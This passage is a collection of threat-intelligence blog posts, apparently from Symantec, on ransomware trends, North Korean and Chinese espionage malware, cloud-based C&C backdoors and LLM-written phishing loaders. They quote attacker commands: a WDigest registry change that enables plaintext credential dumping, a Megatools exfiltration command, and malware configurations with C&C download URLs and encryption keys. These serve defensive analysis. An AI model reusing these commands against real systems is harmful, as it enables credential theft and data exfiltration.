ransomware-as-a-service operation, reportedly offering more attractive terms than rival outfits. Another group that stepped up attacks was Qilin (aka Agenda), which claimed 140 attacks in the third quarter, up from 97 in the second quarter. There was once again a significant difference between the overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit still figured highly in the number of claimed attacks, it only accounted for 7% of the attacks investigated by Symantec in the third quarter. While RansomHub accounted for 15% of publicly claimed attacks, it was responsible for a third of the attacks investigated by Symantec, supporting reports that it is signing up experienced affiliate attackers from rival groups. Today’s ransomware attacks are complex multi-stage intrusions that involve the deployment of multiple tools and often a significant amount of hands-on-keyboard activity on the part of the attackers. An analysis of the most frequently seen tools used in ransomware attacks gives some indication of the favored tactics, techniques, and procedures (TTPs) among ransomware actors at present. These tools fall mostly into four categories: Living off the Land:Utilities that are native to the Windows environment that can be leveraged by an attacker. Tools such as PsExec and WMI can be leveraged by attackers to move laterally on networks and execute commands on remote machines. PowerShell, meanwhile, is a powerful scripting tool that can be used to run commands, download payloads, move laterally, and carry out reconnaissance. Impairing Defenses:A growing number of attackers are using tools that leverage the Bring Your Own Vulnerable Driver (BYOD) technique. Attackers will deploy a signed vulnerable driver to the target network and use that driver to kill security software. Drivers are given kernel access, which means that they can be used to kill processes. In most cases, the vulnerable driver is deployed along with a malicious executable, which will use the driver to issue commands. Remote Desktop/Remote Admin:While these software packages are used legitimately for remote administration or tech support, attackers are turning to them because they effectively provide backdoor access to a machine. Tools such as RDP, AnyDesk, Splashtop, and ScreenConnect are frequently deployed by ransomware actors. Data Exfiltration:Most ransomware groups carry out double-extortion attacks, stealing data from a victim’s network prior to encryption and using the threat of leaking that stolen data as an additional form of leverage. Rclone is the most frequently used exfiltration tool. Many of the remote admin packages used by ransomware actors also have exfiltration capabilities. The growth of ransomware operations such as RansomHub and Qilin to rival LockBit isn’t welcome news, as it may make the ransomware ecosystem more robust and less likely to experience major disruption should a dominant operator be taken down or go offline. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-threat-level-remains-high"
  },
  {
    "title": "stonefly north korea extortion",
    "content": "Symantec’s Threat Hunter Team has found evidence that the North Korean Stonefly group (aka Andariel, APT45, Silent Chollima, Onyx Sleet) is continuing to mount financially motivated attacks against organizations in the U.S., despite being the subject of an indictment and a multi-million dollar reward. Symantec, part ofBroadcom, found evidence of intrusions against three different organizations in the U.S. in August of this year, a month after the indictment was published. While the attackers didn’t succeed in deploying ransomware on the networks of any of the organizations affected, it is likely that the attacks were financially motivated. All the victims were private companies and involved in businesses with no obvious intelligence value. In several of the attacks, Stonefly’s custom malware Backdoor.Preft (aka Dtrack, Valefor) was deployed. This tool is exclusively associated with the group. In addition to this,several Stonefly indicators of compromise recently documented by Microsoftwere found on the compromised networks. The attackers used a fake Tableau certificate documented by Microsoft in addition to two other certificates (see Indicators of Compromise) that appear to be unique to this campaign. Preft:Multi-stage backdoor capable of downloading and uploading files, executing commands, and downloading additional plugins. Preft can support multiple plugin types, including executable files, VBS, BAT, and shellcode. It has multiple persistence modes, including Startup_LNK, Service, Registry, and Task Scheduler. Nukebot:Backdoor capable of executing commands, downloading and uploading files, and taking screenshots. Nukebot has not been associated with Stonefly before; however, its source code was leaked and this is likely how Stonefly obtained the tool. Batch files:The attackers used a malicious batch file to enable plaintext credentials, modifying the registry to add: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 Mimikatz (see below) was then executed to dump credentials. Mimikatz:Publicly availablecredential dumping tool. The attackers used a custom variant of the tool that writes harvested credentials to the file C:\\Windows\\Temp\\KB0722.log. A similar custom variant of Mimikatz found on VirusTotal was linked by Mandiant to Stonefly. Keyloggers: The attackers deployed two distinct keyloggers in their attacks: Sliver:Open-sourcecross-platform penetration testing framework. Chisel:Open-source proxy tool. It creates a TCP/UDP tunnel that is transported over HTTP and secured via SSH. PuTTY:Publicly availableSSH client. Plink: Acommand-line connection toolfor PuTTY Megatools:Acommand line clientfor the Mega.nz cloud storage service. Megatools was used to perform data exfiltration: CSIDL_WINDOWS\\temp\\mt.exe put -u [REMOVED] -p [REMOVED] CSIDL_WINDOWS\\temp\\sig.rar /Root Snap2HTML:Publicly available toolthat takes snapshots of folder structures on a hard drive and saves them as HTML files. FastReverseProxy (FRP):Open-sourced toolto expose local servers to the public internet. On July 25, 2024,the U.S. Justice Department indicted a North Korean man named Rim Jong Hyokon charges related to the attack campaign. Rim is alleged to be a member of the Stonefly group, which is linked to the North Korean military intelligence agency, the Reconnaissance General Bureau (RGB). He was charged with being involved in extorting U.S. hospitals and other healthcare providers between 2021 and 2023, laundering the ransom proceeds, and then using these proceeds to fund additional cyberattacks against targets in the defense, technology, and government sectors worldwide. Targets of these follow-on attacks included two U.S. Air Force bases, NASA-OIG, and organizations located in Taiwan, South Korea, and China. In addition to the indictment, the U.S. Department of Stateoffered a reward of up to $10 million for informationon his location or identification. Stonefly first came to notice in July 2009, when it mounted distributed denial-of-service (DDoS) attacks against a number of South Korean, U.S. government, and financial websites. It reappeared again in 2011, when it launched more DDoS attacks, but also revealed an espionage element to its attacks when it was found to be using a sophisticated backdoor Trojan (Backdoor.Prioxer) against selected targets. In March 2013, the group was linked to the Jokra (Tojan.Jokra) disk-wiping attacks against a number of South Korean banks and broadcasters. Three months later, the group was involved in a string ofDDoS attacks against South Korean government websites. In recent years, the group’s capabilities have grown markedly and, since at least 2019, Symantec has seen its focus shift mainly to espionage operations against select, high-value targets. It appears to specialize in targeting organizations that hold classified or highly sensitive information or intellectual property. While other North Korean groups are well known for mounting financial attacks driven by the need to raise foreign currency for the regime, Stonefly had until recent years appeared not to be involved in financially motivated attacks. While Stonefly’s move into financially motivated attacks is a relatively recent development, the spotlight shone on the group’s activities due to the indictment naming one of its members has not yet led to a cessation of activity. The group is likely continuing to attempt to mount extortion attacks against organizations in the U.S. For the latest protection updates, please visit theSymantec Protection Bulletin. thumbprint = \"313cffaac3d1576ca3c1cee8f9a68a15a24ff418\"issuer = \"/CN=Baramundi Inc.\"subject = \"/CN=Baramundi Inc.\"version = 3algorithm = \"sha1WithRSA\"algorithm_oid = \"1.3.14.3.2.29\"serial = \"af:6d:f9:f9:69:86:58:80:49:1e:2b:ae:20:9f:0d:12\"not_before = 1683852503not_after = 2208988799verified = 1digest_alg = \"sha1\"digest = \"efe03d9be2cd148594e5fcb7272a40b85e33d2bf\"file_digest = \"efe03d9be2cd148594e5fcb7272a40b85e33d2bf\"number_of_certificates = 1 thumbprint = \"10b8b939400a59d2cb79fff735796d484394f8dd\"issuer = \"/CN=VEXIS SOFTWARE LTD.\"subject = \"/CN=VEXIS SOFTWARE LTD.\"version = 3algorithm = \"sha1WithRSA\"algorithm_oid = \"1.3.14.3.2.29\"serial = \"bc:bf:05:4e:a8:b2:69:be:4c:c9:04:f0:8d:f9:eb:97\"not_before = 1710348691not_after = 2208988799verified = 1digest_alg = \"sha1\"digest = \"b9b5d20438cf54acf33ee5731dc283554b8a044c\"file_digest = \"b9b5d20438cf54acf33ee5731dc283554b8a044c\"number_of_certificates = 1 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/stonefly-north-korea-extortion"
  },
  {
    "title": "ransomware attacks rebound",
    "content": "Ransomware activity increased markedly in the second quarter of 2024 as attackers seemingly recovered their momentum following the disruption experienced in late 2023 and early 2024. Analysis of data from ransomware leak sites found that ransomware actors claimed 1,310 attacks in the second quarter of 2024, a 36% increase on the first quarter of this year. This was the second highest amount of attacks claimed in a quarter by ransomware operators, short of the record 1,488 attacks claimed in the third quarter of 2023. Powering this increase in attacks has been the complete recovery of LockBit from disruption experienced following aninternational law enforcement operationin February 2024. LockBit, which is operated by the Syrphid cybercrime group, has long been the most prolific ransomware operation but experienced a dip in activity in the first quarter of this year. However, LockBit attacks increased significantly in the second quarter of 2024 and, with 353 attacks claimed this quarter, are now higher than ever. Another factor driving the overall increase in attacks has been the emergence of a number of operators to occupy the space once controlled by the now-departed Noberus ransomware operation. Noberus, along with LockBit, was among the dominant players before it closed down in March 2024, citing the impact of a law enforcement operation along with reports of a falling out with many of its affiliates. Chief among these successors has been Qilin (aka Agenda), which first emerged in late 2022 and is reportedly run as a ransomware-as-service (RaaS) operation.Attacks claimed by Qilin increased by 47% to 97 in the second quarter of 2024.Play, which has reportedly opened an RaaS operation, saw its attacks increase by 27% to 89 in the second quarter. Perhaps the most significant uptick in claimed attacks involved RansomHub,which first appeared in only February 2024 but appears to have been quick in winning over affiliates to its RaaS operation. Attacks claimed by RansomHub more than tripled in the second quarter to 75, up from 23 in the first quarter of this year. RansomHub’s surge in activity has pushed it into the center of the ransomware ecosystem and it was the fourth most prolific ransomware family in the second quarter. Yet again, there were marked differences between overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit in both cases counted for the largest proportion of attacks, it claimed 27% of all publicly reported attacks and was responsible for 19% of all attacks investigated by Symantec. Conversely, Play was behind 19% of all attacks investigated by Symantec, but only accounted for 7% of all publicly claimed attacks. The comparison may give some indication of success rates experienced by actors linked to each operation. For Symantec to positively identify an attack as associated with a certain ransomware family, the attack has to advance to the stage where the attackers attempt to deploy a payload. This suggests that attackers using Play are more likely to advance their attacks at least to the payload deployment stage. Although the vector may not be discovered for every ransomware attack, the available evidence suggests that attackers are continuing to favor the exploitation of known vulnerabilities in public-facing applications as a means of access. For example, in July 2024, Symantec found that threat actors linked to the Snakefly cybercrime group were actively scanning for CrushFTP servers vulnerable toCVE-2024-4040to run remote commands to download malware onto compromised machines. While CVE-2024-4040 was patched on April 19, 2024, Snakefly was continuing to search for and exploit unpatched systems. Snakefly is a specialist in these kinds of attacks and has along track record of exploiting recently patched and zero-day vulnerabilitiesin order to mount extortion campaigns. Snakefly is responsible for the Cl0p ransomware and it appeared to be highly likely that the final objective of this campaign was the deployment of Cl0p ransomware. Along with exploitation of known vulnerabilities there is anecdotal evidence of attackers targeting exposed RDP servers with weak credentials and poor network segmentation to facilitate lateral movement. In many cases, the absence of multi-factor authentication (MFA) across these services means that weak credentials are particularly vulnerable to exploitation. The sharp increase in attacks in the second quarter of this year suggests that momentum is once again with attackers. While high-profile ransomware operations such as Noberus shut down, the pool of skilled affiliates appears to be undisturbed and many appear to simply migrate to alternative franchises. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-attacks-rebound"
  },
  {
    "title": "taiwan malware dns",
    "content": "A previously unseen backdoor (Backdoor.Msupedge) utilizing an infrequently seen technique was deployed in an attack against a university in Taiwan. The most notable feature of this backdoor is that it communicates with a command-and-control (C&C) server via DNS traffic. While the technique is known and has beenused by multiple threat actors, it is nevertheless something that is not often seen. Msupedge is a backdoor in the form of a dynamic link library (DLL). It has been found installed in the following file paths: While wuplog.dll is loaded by Apache (httpd.exe), the parent process for wmiclnt.dll is unknown. Msupedge uses DNS tunneling for communication with the C&C server. The code for the DNS tunneling tool is based onthe publicly available dnscat2tool. It receives commands by performing name resolution. The host names that are resolved are structured as follows: Error notifications include the success or failure of the following: The backdoor also appears to encode the result of the command execution as a fifth-level domain and send it. Msupedge not only receives commands via DNS traffic but also uses the resolved IP address of the C&C server (ctl.msedeapi[.]net) as a command. The third octet of the resolved IP address is a switch case. The behavior of the backdoor will change based on the value of the third octet of the resolved IP address minus seven. For example, if the third octet is 145, this translates to 138 (expressed in hexadecimal as 0x8a) Msupedge supports the following commands: The initial intrusion was likely through the exploit of a recently patched PHP vulnerability (CVE-2024-4577). The vulnerability is a CGI argument injection flaw affecting all versions of PHP installed on the Windows operating system. Successful exploitation of the vulnerability can lead to remote code execution. Symantec has seen multiple threat actors scanning for vulnerable systems in recent weeks. To date, we have found no evidence allowing us to attribute this threat and the motive behind the attack remains unknown. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. e08dc1c3987d17451a3e86c04ed322a9424582e2f2cb6352c892b7e0645eda43 – Backdoor.Msupedge f5937d38353ed431dc8a5eb32c119ab575114a10c24567f0c864cb2ef47f9f36 – Backdoor.Msupedge a89ebe7d1af3513d146a831b6fa4a465c8edeafea5d7980eb5448a94a4e34480 – Web shell The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/taiwan-malware-dns"
  },
  {
    "title": "cloud espionage attacks",
    "content": "The number of threat actors leveraging legitimate cloud services in their attacks has grown this year as attackers have begun to realize their potential to provide low-key and low-cost infrastructure. Traffic to and from well known, trusted services such as Microsoft OneDrive or Google Drive may be less likely to raise red flags than communications with attacker-controlled infrastructure. In the past few weeks alone, Symantec’s Threat Hunter Team has identified three further espionage operations using cloud services and found evidence of further tools in development. Marc Elias, an investigator with the Threat Hunter Team,will be presenting these findings today (August 7) at the Black Hat Conference in Las Vegas. A previously unseen backdoor which Symantec has named GoGra (Trojan.Gogra) was deployed against a media organization in South Asia in November, 2023. GoGra is written in Go and uses the Microsoft Graph API to interact with a command-and-control (C&C) server hosted on Microsoft mail services. Graph is a Microsoft API designed to facilitate access to resources hosted on Microsoft cloud services, such as Microsoft 365. Authentication is carried out using OAuth access tokens. GoGra is configured to read messages from an Outlook username \"FNU LNU\" whose subject line starts with the word \"Input\". It decrypts the message contents using the AES-256 algorithm in Cipher Block Chaining (CBC) mode, using the following key: b14ca5898a4e4133bbce2ea2315a1916. Gogra executes commands via the cmd.exe input stream and supports an additional command named \"cd\" which changes the active directory. After the execution of a command, it encrypts the output and sends it to the same user with the subject \"Output\". Analysis of the backdoor revealed that it is highly likely it was developed by Harvester, a nation-state-backed groupuncovered by Symantec in 2021that specializes in targeting organizations in South Asia. GoGra is functionally similar to a known Harvester tool called Graphon, which was written in .NET. Aside from the different programming languages used, Graphon used a different AES key (juBvYU7}33Xq}ghO), did not contain the extra “cd” command, and did not have a hardcoded Outlook username to communicate with. The username was instead received from the C&C server. A previously unseen exfiltration tool was deployed by the Firefly espionage group in an attack against a military organization in South East Asia. Analysis of the tool revealed that it was apublicly available Google Drive clientin a Python wrapper. The tool was configured to search for all .jpg files in the System32 directory and upload them to Google Drive using a hardcoded refresh token. Many of the exfiltrated files were not actual .jpg images but were instead encrypted RAR files, which were likely either created by hands-on-keyboard activity by the attackers or by another attacker-deployed tool that copied and prepared data for exfiltration. Exfiltrated data included documents, meeting notes, call transcripts, building plans, email folders, and accounting data. A previously unseen backdoor named Trojan.Grager was deployed against three organizations in Taiwan, Hong Kong, and Vietnam in April 2024. Analysis of the backdoor revealed that it used the Graph API to communicate with a C&C server hosted on Microsoft OneDrive. Grager was downloaded from a typosquatted URL mimicking the open-source file archiver 7-Zip (hxxp://7-zip.tw/a/7z2301-x64[.]msi). The aforementioned MSI file, which acts as a dropper, is a Trojanized 7-Zip installer that installs the real 7-Zip software into the folder “C:\\Program Files (x86)\\7-Zip” along with a malicious DLL named “epdevmgr.dll” (SHA2: ab6a684146cec59ec3a906d9e018b318fb6452586e8ec8b4e37160bcb4adc985), a copy of the Tonerjam malware, and the encrypted Grager backdoor into a file named “data.dat” (SHA2: 45a5dd715dc5f08f3b987a0415c2e500c549508aadf4183fdb94f749af8f1d67). The Tonerjam malwarewas described by Mandiantas a launcher that decrypts and executes a shellcode payload, which in this case was the new backdoor Grager. The backdoor decrypts a client_id and refresh token for OneDrive from a blob within the file’s body. The backdoor supports the following commands: There are tentative links between this tool and a group known as UNC5330. Symantec observed the Tonerjam malware described in this blog being dropped with the same file name (epdevmgr.dll) by a benign sample named (EpDevMgr.exe), which Mandiant also attributes to UNC5330. UNC5330 was described as a “suspected China-nexus espionage actor” that exploited Ivanti Connect Secure VPN vulnerabilities (CVE-2024-21893 and CVE-2024-21887) to compromise appliances in early 2024. Symantec also found evidence of another backdoor called MoonTag (Trojan.Moontag) that appears to be currently in development. Several variants of the backdoor have been uploaded to VirusTotal in recent weeks, although none appeared complete. The malware, which may be named “Moon_Tag” by its developer given references in its strings, is based oncode published in this Google Group. All the variants found contain functionality for communicating with the Graph API. MoonTag samples match a YARA rule named “MAL_APT_9002_SabrePanda” that detects samples from the 9002 RAT malware family used by the Sabre Panda threat actor. We did not find strong links to attribute MoonTag to Sabre Panda, but we can attribute the MoonTag backdoor with high confidence to a Chinese-speaking threat actor based on the Chinese language used in the Google Group post and the infrastructure used by the attackers. Another backdoor (Trojan.Ondritols), which appears to be called Onedrivetools by its authors, has been deployed against IT services companies in the U.S. and Europe. A multi-stage backdoor, the first stage is a downloader that authenticates to Microsoft Graph API and downloads the second stage payload from OneDrive and executes it. The main payload will downloada publicly available filefrom GitHub. It will then create a folder in OneDrive named deviceId_n_<ip address> for each infected machine and upload the following file to OneDrive to signal the attackers the status of a new infection: /v1.0/me/drive/root:/deviceId_n_<ip address>/status It will then continue in a loop, authenticating itself using Graph API, creating a file called heartbeat with the content “1” and fetching the new commands to execute from a file called cmd, both files located in the victim folder. The output of the executed command will be saved in the same cmd file. The backdoor also can download files to its victims and upload files from the infected machine to OneDrive. The attackers used a tunneling tool known as Whipweave (SHA256: 30093c2502fed7b2b74597d06b91f57772f2ae50ac420bcaa627038af33a6982), likely derived from the open-source Chinese VPN Free Connect (FCN) project, to connect to an Operational Relay Box (ORB) network known as Orbweaver which is designed to obfuscate the origin of attacks. In May 2024,Symantec uncovered BirdyClient, new malware that used the Graph API to communicate with a OneDrive C&C server. The malware was used in an attack against an organization in Ukraine. Although leveraging cloud services for command and control is not a new technique, more and more attackers have started to use it recently. Three years ago, Volexity published aboutBlueLight, malware developed by the North Korea-linked Vedalia espionage group (aka APT37). This was followed by Symantec’s discovery of the Graphon backdoor in October 2021. The Russian Swallowtail espionage group (aka APT28, Fancy Bear) was found to have adopted the tactic followingthe discovery of Graphite—malware that used the Graph API to communicate with a OneDrive account that was acting as a C&C server. In June 2023,Symantec discovered Backdoor.Graphican, which was being used by the Flea (aka APT15, Nickel) group in a campaign against foreign affairs ministries in the Americas. The number of actors now deploying threats that leverage cloud services suggests that espionage actors are clearly studying threats created by other groups and mimicking what they perceive to be successful techniques. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. d728cdcf62b497362a1ba9dbaac5e442cebe86145734410212d323a6c2959f0f – Trojan.Gogra f1ccd604fcdc0034d94e575b3709cd124e13389bbee55c59cbbf7d4f3476e214 – Trojan.Gogra 9f61ed14660d8f85d606605d1c4c23849bd7a05afd02444c3b33e3af591cfdc9 – Trojan.Grager ab6a684146cec59ec3a906d9e018b318fb6452586e8ec8b4e37160bcb4adc985 – Trojan.Grager 97551bd3ff8357831dc2b6d9e152c8968d9ce1cd0090b9683c38ea52c2457824 – Trojan.Grager f69fb19604362c5e945d8671ce1f63bb1b819256f51568daff6fed6b5cc2f274 – Trojan.Ondritols 582b21409ee32ffca853064598c5f72309247ad58640e96287bb806af3e7bede – Trojan.Ondritols 79e56dc69ca59b99f7ebf90a863f5351570e3709ead07fe250f31349d43391e6 – Trojan.Ondritols 4057534799993a63f41502ec98181db0898d1d82df0d7902424a1899f8f7f9d2 – Trojan.Ondritols a76507b51d84708c02ca2bd5a5775c47096bc740c9f7989afd6f34825edfcba6 – Trojan.Moontag 527fada7052b955ffa91df3b376cc58d387b39f2f44ebdcb54bc134e112a1c14 – Trojan.Moontag fd9fc13dbd39f920c52fbc917d6c9ce0a28e0d049812189f1bb887486caedbeb – Trojan.Moontag 30093c2502fed7b2b74597d06b91f57772f2ae50ac420bcaa627038af33a6982 – Whipweave hxxp://7-zip.tw/a/7z2301-x64[.]msi - Trojan.Grager download URL hxxp://7-zip.tw/a/7z2301[.]msi - Trojan.Grager download URL 7-zip[.]tw – 7-Zip typosquatted domain 103.255.178[.]200 – MoonTag C&C 157.245.159[.]135 – Whipweave C&C 89.42.178[.]13 – Whipweave C&C 30sof.onedumb[.]com – Whipweave C&C The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/cloud-espionage-attacks"
  },
  {
    "title": "malware ai llm",
    "content": "Symantec has observed an increase in attacks that appear to leverage Large Language Models (LLMs) to generate malicious code used to download various payloads. LLMs are a form of generative AI designed to understand and generate human-like text. They have a wide range of applications, from assisting in writing to automating customer service. However, like many powerful technologies, LLMs can also be abused. Recent malware campaigns observed by Symantec involved phishing emails containing code used to download various payloads, including Rhadamanthys, NetSupport, CleanUpLoader (Broomstick, Oyster), ModiLoader (DBatLoader), LokiBot, and Dunihi (H-Worm). Analysis of the scripts used to deliver malware in these attacks suggests they were generated using LLMs. The following example details a campaign targeting a wide range of sectors. The attacks involve phishing emails with attached .zip archives containing malicious .lnk files, which, once executed, trigger LLM-generated PowerShell scripts that lead to the deployment of malware. The emails purport to relate to an urgent financing issue and contain a password-protected ZIP file, the password for which is also included in the email. The ZIP file contains an LNK file that, when executed, runs a PowerShell script (Figure 2) likely generated using an LLM. Functions and variables are nicely formatted with leading single-line comments that use highly accurate grammar to explain their usage. The script can easily be produced automatically using an LLM. We were able to produce similar results during our research using ChatGPT and a series of simple prompts (Figure 3). Final payloads deployed in this campaign included the Rhadamanthys information-stealing malware and the CleanUpLoader backdoor (aka Broomstick, Oyster). The following example details the use of LLM-generated code to facilitate the phishing stage and the payload delivery stage of an attack. The following describes the attack chain events. 1. Initial access:User receives a human-crafted phishing email with an attachment, mimicking an HR notification. 2. Execution of LLM-generated script:Opening the malicious attachment executes an HTML file with embedded JavaScript that is highly likely generated by an LLM. This script is designed to download and execute additional payloads, although the webpage displayed in this case is fairly simple and the HTML behind it is small and quick to load. Analysis of the HTML file, which facilitates a crucial link of the attack chain, reveals the characteristic features of an LLM-generated file (Figure 6). The file itself can easily be produced automatically using an LLM, with little human effort required. 3. Final payload download:By the time the user sees the page shown in Figure 5, the next stage payload – a loader for the Dunihi (H-Worm) malware – would have already been downloaded if the user has not configured their browser to ask for download permission first. Symantec also observed campaigns delivering the ModiLoader (DBatLoader) malware loader, the LokiBot information-stealing Trojan, and NetSupport remote access Trojan. The use of LLMs to generate HTML code used in these campaigns is also suspected. The potential for AI to revolutionize our world is undeniable; however, it is also revolutionizing cybercrime. AI tools such as LLMs lower the barrier to entry for many threat actors, while increasing the level of sophistication for others. As we have shown, AI-powered tools have given threat actors not only the ability to quickly craft convincing and targeted phishing emails, but also to generate malicious code that would normally require considerable expertise, time, and resources. It is worth highlighting that AI is only going to get better. While the benefits for society are sure to be great, malicious actors will also benefit, using it to launch more sophisticated and effective attacks faster and at a larger scale. Symantec is at the forefront of cybersecurity, offering robust protection against the never-ending wave of new threats, including those recently observed, highly likely generated by LLMs. Our security solutions are equipped with advanced detection capabilities that block AI-based LLM-generated threats, with our threat hunting experts continuously monitoring the threat landscape, harvesting emerging threats, conducting detailed analysis, updating our automation models, and ensuring our customers are always protected. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. Hoang Giang is a member of the Threat Engineering team in Symantec’s Security Technology and Response (STAR) division. He analyzes and creates protection for various threats and monitors for botnets and APT attacks. Yi (Helen) is a member of the Threat Engineering team in Symantec’s Security Technology and Response (STAR) division under Broadcom's Enterprise Security Group. Yi executes and implements a variety of protections for our customers and collaborates with threat hunting experts to leverage insights from the threat landscape for improved operations and security. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/malware-ai-llm"
  },
  {
    "title": "daggerfly espionage updated toolset",
    "content": "The Daggerfly (aka Evasive Panda, Bronze Highland) espionage group has extensively updated its toolset, introducing several new versions of its malware, most likely in response to exposure of older variants. The new tooling was deployed in a number of recent attacks against organizations in Taiwan and a U.S. NGO based in China, which indicates the group also engages in internal espionage. In the attack on this organization, the attackers exploited a vulnerability in an Apache HTTP server to deliver their MgBot malware. Among the new additions to Daggerfly’s arsenal are a new malware family based on the group’s MgBot modular malware framework and a new version of the Macma macOS backdoor. While Macma is a previously documented threat, it had hitherto been of unknown authorship. However, Symantec’s Threat Hunter Team has now found evidence suggesting that it is developed by Daggerfly. Active for at least a decade, Daggerfly is primarily known for its development and use of the MgBot framework. In 2023,Symantec reported a Daggerfly intrusionagainst a telecoms operator in Africa involving previously unseen plugins for MgBot. Macma is a macOS backdoor that wasfirst documented by Google in 2021but appears to have been used since at least 2019. At the time of discovery, it was being distributed in watering hole attacks involving compromised websites in Hong Kong. The watering holes contained exploits for iOS and macOS devices. Users of macOS devices were targeted with a privilege escalation vulnerability (CVE-2021-30869) which allowed the attackers to install Macma on vulnerable systems. Macma is a modular backdoor. Functionality includes: Following its exposure, further details about the threat were published byObjective-SeeandSentinelOne. Recent variants of Macma found by Symantec exhibit evidence of ongoing development. One version (SHA256: 003764fd74bf13cff9bf1ddd870cbf593b23e2b584ba4465114023870ea6fbef) contained a different main module (SHA256: 1f5e4d2f71478518fe76b0efbb75609d3fb6cab06d1b021d6aa30db424f84a5e) to previously documented versions. The main difference lies in strings that appear to function as configuration data (see Figure 1). A second version of Macma (SHA256: dad13b0a9f5fde7bcdda3e5afa10e7d83af0ff39288b9f11a725850b1e6f6313) contained what appeared to be incremental updates to the existing functionality. Some of the identified updates included: Its main module (SHA256: fce66c26deff6a5b7320842bc5fa8fe12db991efe6e3edc9c63ffaa3cc5b8ced) exhibited evidence of more extensive modification. This included: In addition to this, it too had different strings containing configuration data (see Figure 1). Another module from this variant (SHA256: eff1c078895bbb76502f1bbad12be6aa23914a4d208859d848d5f087da8e35e0) contained modified code to adjust the size of a created screen capture, which apparently related to the aspect ratio when resizing the capture. Although Macma was widely believed to have been linked to advanced persistent threat (APT) activity, it has hitherto not been linked to a particular group. However, Symantec has found evidence to suggest that it is part of the Daggerfly toolkit. Two variants of the Macma backdoor connected to a command-and-control (C&C) server (103.243.212[.]98) that was also used by an MgBot dropper. In addition to this shared infrastructure, Macma and other known Daggerfly malware including Mgbot all contain code from a single, shared library or framework. Elements of this library have been used to build Windows, macOS, Linux, and Android threats. Functionality provided by this library includes: An example of this library code is seen when the magic string \"inp\" is sent over a SOCK_DGRAM socket: sendto(*(_DWORD *)(v2 + 56), \"inp\", 3, 0, (const struct sockaddr *)(v2 + 60), 16); While sendto() may be used to communicate with other hosts in general, here the communication is with a local machine (127.0.0), and could be even be threads in the same process. Another example involves the magic string \"tim\" being sent over a socket similar to the following: sendto(*(_DWORD *)(v1 + 56), \"tim\", 3, 0, (const struct sockaddr *)(v1 + 60), 16); Symantec has yet to find any matching code in public repositories. Shared code and shared infrastructure between Macma and other Daggerfly tools suggests that Macma is also part of the Daggerfly toolkit. A new addition to Daggerfly’s toolkit is a Windows backdoor (Trojan.Suzafk),which was first documented by ESET in March 2024as Nightdoor (aka NetMM) when it was observed being used alongside Mgbot. Suzafk was developed using the same shared library used in Mgbot, Macma, and a number of other Daggerfly tools. Suzafk is a multi-staged backdoor capable of using TCP or OneDrive for C&C. The malware contained the following configuration, indicating the functionality to connect to OneDrive is in development or present in other variants of the malware: ReadMe=ConnONEDRIVE;Version=256;Tag=15ad490f332f3d9a;DownloadUrl=http://103.96.131.150:19876/30_1410402971.exe;token={\"refresh_token\":\"REDACTED\",\"client_id\":\"4aa6708f-f3c8-4511-8118-5a7208be6a44\",\"client_secret\":\"REDACTED\"};DownloaderSavePath=C:\\Programdata\\Office\\;HttpServerFolder=C:\\Program Files\\Common Files\\Cloudata\\; Another configuration to use a TCP connection for C&C purposes is also present in the backdoor: ReadMe=ConnTCP;Version=256;Tag=15ad490f332f3d9a;DownloadUrl=http://103.96.131.150:19876/30_1292836936.exe;IP=103.96.131.150;Port=40020;DownloaderSavePath=C:\\\\Programdata\\\\Office\\\\;HttpServerFolder=C:\\\\Program Files\\\\Common Files\\\\Cloudata\\\\; The loader (SHA256: 5687b32cdd5c4d1b3e928ee0792f6ec43817883721f9b86ec8066c5ec2791595) drops two files: Engine.dll and MeitUD.exe. MeituUD.exe is a legitimate application named DAEMON Tools Lite Helper. Engine.dll is a loader DLL that sets persistence via scheduled tasks and loads the final payload in memory. The backdoor has embedded code from the al-khaser project, a public code repository aimed to detect virtual machines, sandboxes, and malware analysis environments. It also creates the folders C:\\ProgramData\\Office\\EFir and C:\\ProgramData\\Office\\Temps and stores additional network configuration data under the C:\\ProgramData\\Office\\sysmgr file XOR encrypted with the key 0x7A. The network configuration in plaintext has the following parameters and values: LOCAL_MAC_ADDR=[mac address] [ManageTermKeyStatus] [ManageTermServerInfoOffset] [ManageTermUseCreateCloudDirAlgorithm] Next, the malware creates a cmd.exe shell to send and receive commands from the C&C server (103.96.131[.]150) via open pipes. Additionally, the following commands can be executed: ipconfigsysteminfotasklistnetstat New findings provide a clearer picture of the capabilities and resources behind Daggerfly. The group can create versions of its tools targeting most major operating system platforms. In addition to the tools documented here, Symantec has seen evidence of the ability to Trojanize Android APKs, SMS interception tools, DNS request interception tools, and even malware families targeting Solaris OS. Daggerfly appears to be capable of responding to exposure by quickly 